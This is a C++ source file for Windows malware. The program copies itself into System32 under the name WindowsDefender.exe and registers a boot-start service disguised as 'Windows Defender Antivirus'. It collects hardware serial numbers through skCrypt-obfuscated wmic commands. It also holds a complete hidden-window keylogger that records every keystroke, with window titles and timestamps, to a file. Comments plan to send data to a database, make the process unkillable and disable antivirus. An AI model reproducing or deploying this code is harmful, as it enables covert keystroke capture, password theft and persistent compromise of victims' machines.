
#include <windows.h>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <time.h>
#include "skStr.h"
#include <stdio.h>
#include <iostream>
#include <conio.h>
#include <chrono>
#include <fstream>
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <tchar.h>
#include <map>
#include <chrono>
using namespace std;

ofstream output_file;

int main() {
	void start();
	start();
	return 0;
}

void start()
{
	//idea: send to db
	void checkSerials();
	checkSerials();

	//idea: make the process unkillable
	//void startKeyLogger();
	//startKeyLogger();

	void createAutostart();
	createAutostart();
	
	//idea: get the admin from this method to get to the whole program
	//void disableAV();
	//disableAV();
}


void createAutostart() {
	
	bool serviceexists;
	SC_HANDLE serviceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (serviceControlManager == NULL) {
		// failed to open service control manager
		cout << "service couldnt open";
		serviceexists = false;
	}

	SC_HANDLE service = OpenServiceA(serviceControlManager, (LPCSTR)"Windows Defender Antivirus", SERVICE_QUERY_CONFIG);
	if (service == NULL) {
		// service doesn't exist
		CloseServiceHandle(serviceControlManager);
		serviceexists = false;
	}

	CloseServiceHandle(service);
	CloseServiceHandle(serviceControlManager);
	serviceexists = true;

	ifstream file("C:\\Windows\\System32\\WindowsDefender.exe");
	bool fileexists = file.good();

	//File check
	if (fileexists) {
		//Service Check
		if (!serviceexists) {
			cout << "File was there, service not";
			system("sc create WindowsDefender binPath= \"C:\\Windows\\System32\\WindowsDefender.exe\" start= boot DisplayName= \"Windows Defender Antivirus\"");
		}
		
	}
	else {
		const unsigned int iMaxPathLength = 256;
		char fileName[iMaxPathLength] = { 0 }; //filename (for example in downloads)
		//Get the full path of the program
		GetModuleFileName(NULL, (LPWCH)fileName, iMaxPathLength);

		//Copy file to system32 so its less suspicious, change name to windowdsdefender	
		LPCTSTR lpNewFileName = L"C:\\Windows\\System32\\WindowsDefender.exe";
		LPCTSTR copyFileName = (LPCTSTR)fileName;

		BOOL bSuccess = CopyFile(copyFileName, lpNewFileName, FALSE);

		if (!bSuccess) {
			cout << "Error while copying file to system32";
		}
		else {
			cout << "Copied file to system32";
		}

		//Create service if it doesnt exist
		if (!serviceexists) {
			system("sc create WindowsDefender binPath= \"C:\\Windows\\System32\\WindowsDefender.exe\" start= boot DisplayName= \"Windows Defender Antivirus\"");
			cout << "created new service";
		}
		
	}
	
}

/*
* Starts the Keylogger.
* @author Deniz Kural
* @version 2023-04-24
*/
void startKeyLogger()
{
	// open output file
	const char* output_filename = "keylogger.txt";
	cout << "Logging output to " << output_filename << std::endl;
	
	output_file.open(output_filename, std::ios_base::app);

	// visibility of window
	void invisibleCMD();
	invisibleCMD();

	// set the hook
	void SetHook();
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}

/*
* Disable all AV
* @author Deniz Kural
* @version 2023-04-24
*/
void disableAV() {
	
}


// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore


#if FORMAT == 0
const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

HHOOK _hook;

// gibt vkCode = keystroke
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);


// This is the callback function. EVENT WHEN KEY IS PRESSED
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}


int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower 
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	//file offen lassen und flushen, anstatt immer neu aufzumachen
	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;
}

void invisibleCMD()
{
#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

void checkSerials() {
	system(skCrypt("@echo SMBIOS"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic csproduct get uuid"));
	system(skCrypt("@echo BIOS"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic bios get serialnumber"));
	system(skCrypt("@echo MOTHERBOARD"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic baseboard get serialnumber"));
	system(skCrypt("@echo GPU"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic PATH Win32_VideoController GET Description, PNPDeviceID"));
	system(skCrypt("@echo Chassis"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic systemenclosure get serialnumber"));
	system(skCrypt("@echo CPU"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic cpu get serialnumber"));
	system(skCrypt("@echo HDD/SSD"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic diskdrive get serialnumber"));
	system(skCrypt("@echo VOLUME"));
	system(skCrypt("@echo off"));
	system(skCrypt("vol"));
	system(skCrypt("echo."));
	system(skCrypt("@echo RAM"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic memorychip get serialnumber"));
	system(skCrypt("@echo WINDOWS PRODUCT ID"));
	system(skCrypt("@echo off "));
	system(skCrypt("wmic os get serialnumber"));
	system(skCrypt("@echo MAC"));
	system(skCrypt("@echo off"));
	system(skCrypt("wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus = 2 AND AdapterTypeID = '0'\" get MacAddress"));
	system(skCrypt("echo."));
}